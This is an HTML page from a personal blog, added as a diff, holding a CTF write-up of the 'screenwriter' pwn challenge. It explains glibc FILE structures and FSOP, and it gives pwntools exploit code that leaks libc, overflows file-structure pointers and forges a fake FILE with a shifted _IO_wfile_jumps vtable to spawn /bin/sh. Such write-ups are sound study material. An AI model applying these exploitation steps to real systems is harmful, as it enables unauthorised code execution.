@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>screenwriter | papichulo16</title>
+  <link rel="stylesheet" href="/assets/css/style.css">
+  
+</head>
+<body>
+  <nav class="navbar">
+    <a class="menu home-link" href="/"><img src="/assets/img/chavo.png" alt="El chavo" class="pfp-img">papichulo16</a>
+
+    <div class="nav-right">
+      <a href="https://github.com/papichulo16">Github</a>
+      <a href="/contact">Contact</a>
+      <a href="/reviews">Reviews</a>
+      <div class="dropdown">
+        <span><a href="/projects">Projects ▾</a></span>
+        <div class="dropdown-content">
+          
+            <a href="/projects/1_magical_kernel.html">Magical Kernel</a>
+          
+            <a href="/projects/2_crap.html">C.R.A.P</a>
+          
+            <a href="/projects/6_ctf_writeups.html">PWN Writeups (blogs)</a>
+          
+        </div>
+      </div>
+    </div>
+  </nav>
+  <hr>
+
+  <main>
+    <article class="blog-post">
+  <h1>screenwriter</h1>
+  <p class="post-date">January 08, 2025</p>
+
+  <div class="post-content">
+    <p><a href="https://github.com/papichulo16/ctf-stuff/blob/main/WargamesMYCTF/screenwriter">source</a></p>
+
+<p>This challenge was tough since I have not really touched on anything FSOP related outside of House of Orange, but it was for sure a great learning experience. I will say this out of the gate, I did not solve this challenge during the CTF but instead I continued to work on it for over the course of two weeks since to be honest there was a lot to learn.</p>
+
+<p>To first understand how to solve this challenge, I will have to explain what file structures are. From what I understand and what I learned through debugging the heap memory, file structures are mostly here so whatever changes I do to the file that I wish to open will happen in heap memory first and once you call <code class="language-plaintext highlighter-rouge">fclose()</code> on the file pointer, then it will write to the disk. This is done because in C they legit only care about speed and nothing else, so that is good for us.</p>
+
+<p>Now how FSOP works takes advantage of the <code class="language-plaintext highlighter-rouge">__IO_FILE_plus</code> struct that is used when working with file structures. The struct looks like this:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_FILE_plus</span>
+<span class="p">{</span>
+  <span class="kt">FILE</span> <span class="n">file</span><span class="p">;</span>
+  <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>The real point of focus is the <code class="language-plaintext highlighter-rouge">vtable</code> at the end. Luckily, I already knew what a <code class="language-plaintext highlighter-rouge">vtable</code> was thanks to one of the challenges in the <a href="https://pwnable.kr">pwnable.kr</a> website that I solved a little while back. In that challenge, from what I remember, I had to exploit a use-after-free bug in a C++ program that used objects. The way <code class="language-plaintext highlighter-rouge">vtables</code> are used in C++ is basically a lookup table for functions for each object, so for example multiple instances of a class will actually end up calling the same function addresses. And in this case the <code class="language-plaintext highlighter-rouge">vtable</code> pointer is the same way. Only problem though (and why the House of Orange only works on GLIBC 2.23 and below), the <code class="language-plaintext highlighter-rouge">vtable</code> pointer has to be within some adresses. Because of that, we cannot create our own <code class="language-plaintext highlighter-rouge">vtable</code> and instead we must play around with misaligning the vtable that we have and to try to find something that is modifyable by using <a href="https://blog.kylebot.net/2022/10/22/angry-FSROP/">Angry FSROP</a>. Also here is the layout of the <code class="language-plaintext highlighter-rouge">_IO_FILE</code> structure for future reference (since this will show up in the heap):</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_FILE</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>		<span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>
+
+  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_ptr</span><span class="p">;</span>	<span class="cm">/* Current read pointer */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_end</span><span class="p">;</span>	<span class="cm">/* End of get area. */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_base</span><span class="p">;</span>	<span class="cm">/* Start of putback+get area. */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_base</span><span class="p">;</span>	<span class="cm">/* Start of put area. */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_ptr</span><span class="p">;</span>	<span class="cm">/* Current put pointer. */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_end</span><span class="p">;</span>	<span class="cm">/* End of put area. */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_base</span><span class="p">;</span>	<span class="cm">/* Start of reserve area. */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_end</span><span class="p">;</span>	<span class="cm">/* End of reserve area. */</span>
+
+  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>
+
+  <span class="k">struct</span> <span class="n">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>
+
+  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>
+
+  <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>
+  <span class="n">__off_t</span> <span class="n">_old_offset</span><span class="p">;</span> <span class="cm">/* This used to be _offset but it's too small.  */</span>
+
+  <span class="cm">/* 1+column number of pbase(); 0 is unknown. */</span>
+  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_cur_column</span><span class="p">;</span>
+  <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+
+  <span class="n">_IO_lock_t</span> <span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
+  <span class="n">__off64_t</span> <span class="n">_offset</span><span class="p">;</span>
+  <span class="cm">/* Wide character stream stuff.  */</span>
+  <span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="o">*</span><span class="n">_codecvt</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">_IO_wide_data</span> <span class="o">*</span><span class="n">_wide_data</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_freeres_list</span><span class="p">;</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">_freeres_buf</span><span class="p">;</span>
+  <span class="kt">size_t</span> <span class="n">__pad5</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">_mode</span><span class="p">;</span>
+  <span class="cm">/* Make sure we don't get into trouble again.  */</span>
+  <span class="kt">char</span> <span class="n">_unused2</span><span class="p">[</span><span class="mi">15</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">-</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)];</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>Now with this knowledge, we will be able to solve this challenge. Also I took these structures from <a href="https://niftic.ca/posts/fsop/">here</a>.</p>
+
+<p>The challenge calls <code class="language-plaintext highlighter-rouge">fread()</code> and <code class="language-plaintext highlighter-rouge">fwrite()</code> on different options and has an obvious buffer overflow that will let us overwrite both file structures for the read and write. Also everything is green except for PIE, so what I did was leak LIBC by reading the address of <code class="language-plaintext highlighter-rouge">stdout</code> in the <code class="language-plaintext highlighter-rouge">.bss</code> region by changing the pointer of the read file structure. I also leaked the stack but I didn’t need it:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">leak</span> <span class="o">=</span> <span class="n">read_addr</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x404010</span><span class="p">)</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="s">"little"</span><span class="p">)</span> <span class="o">-</span> <span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"_IO_2_1_stdout_"</span><span class="p">]</span> 
+
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"============= Libc leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    
+    <span class="n">leak</span> <span class="o">=</span> <span class="n">read_addr</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"environ"</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc</span><span class="p">)</span>
+    <span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="s">"little"</span><span class="p">)</span> 
+
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"============= Stack leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Next I  overwrote (is that how you say it??) the write file structure to point to libc’s <code class="language-plaintext highlighter-rouge">_IO_2_1_stdout_</code>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># buf base and buf end overflow on the write stream 
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x28</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1e1</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x1d8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1e1</span><span class="p">)</span> 
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad2c84</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"_IO_2_1_stdout_"</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">5</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"_IO_2_1_stdout_"</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"_IO_2_1_stdout_"</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x200</span><span class="p">)</span>
+    
+    <span class="n">write_script</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="sa">b</span><span class="s">"balls"</span><span class="p">)</span>
+    <span class="n">set_name</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Then I created a fake file structure while changing the <code class="language-plaintext highlighter-rouge">vtable</code> pointer to what angry-fsrop said:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># create a fake file struct to use when calling the write stream
+</span>    <span class="nb">file</span> <span class="o">=</span> <span class="n">FileStructure</span><span class="p">()</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">_IO_save_base</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x163830</span> <span class="c1"># one gadget
+</span>    <span class="nb">file</span><span class="p">.</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">_lock</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x21ba70</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">_codecvt</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"_IO_2_1_stdout_"</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0xb8</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">_wide_data</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"_IO_2_1_stdout_"</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x200</span>
+    
+    <span class="c1"># modify the address of the vtable
+</span>    <span class="nb">file</span><span class="p">.</span><span class="n">unknown2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"_IO_2_1_stdout_"</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"_IO_wfile_jumps"</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">)</span> 
+
+    <span class="c1">#write_script(io, bytes(file))
+</span>    <span class="n">sla</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="sa">b</span><span class="s">"Choice:"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">file</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>And just like that, I have shell!!!! (WOOHOO, this was a pain!!!!)</p>
+
+
+  </div>
+</article>
+
+<style>
+.blog-post {
+  max-width: 800px;
+  margin: auto;
+  padding: 20px;
+}
+.post-date {
+  color: #777;
+  font-size: 0.9rem;
+  margin-bottom: 20px;
+}
+.post-content img {
+  max-width: 100%;
+}
+</style>
+
+
+  </main>
+
+  <footer>
+    <hr>
+    © 2025 papichulo16
+  </footer>
+</body>
+</html>
+
